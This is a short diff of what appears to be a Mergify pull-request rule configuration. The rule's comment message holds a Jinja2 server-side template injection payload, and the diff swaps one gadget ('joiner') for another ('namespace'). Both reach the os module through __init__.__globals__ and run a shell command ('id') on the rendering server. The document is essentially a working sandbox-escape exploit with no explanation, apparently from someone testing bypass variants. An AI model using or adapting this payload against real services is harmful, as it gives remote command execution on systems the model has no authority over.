@@ -1,10 +1,10 @@
 pull_request_rules:
-  - name: vm6-j2s-joiner-261016
+  - name: vm6-j2s-ns-261016
     conditions:
-      - label = vm6-j2s-joiner
+      - label = vm6-j2s-ns
     actions:
       comment:
-        message: "{{ joiner.__init__.__globals__['os'].popen('id').read() }}"
+        message: "{{ namespace.__init__.__globals__.os.popen('id').read() }}"
 
 commands_restrictions:
   queue:
